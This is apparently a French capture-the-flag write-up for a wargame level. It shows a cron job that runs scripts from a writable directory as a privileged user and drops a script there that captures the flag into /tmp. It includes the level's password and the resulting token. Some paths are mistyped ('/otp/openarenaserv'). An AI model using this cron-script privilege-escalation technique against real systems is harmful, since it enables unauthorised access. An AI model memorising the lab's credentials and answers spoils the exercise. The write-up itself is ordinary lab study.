
**LOGIN: level05**

**PASSWORD: ne2searoevaevoem4ov4ar8ap**

 ----

Rien dans le *HOME* mais vu précedemment : 

```
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
```
cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Ok, donc toutes les 2 minutes, les scripts présents dans */opt/openarenaserv/** sont exec. On a les droits d'écriture dans le repertoire. 

```
vim /otp/openarenaserv/exploit.sh

getflag >/tmp/flag.txt
chmod +r /tmp/flag.txt
```

On fait un café, puis on revient 2 minutes plus tard. 

```
cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

**TOKEN: viuaaale9huek52boumoomioc**




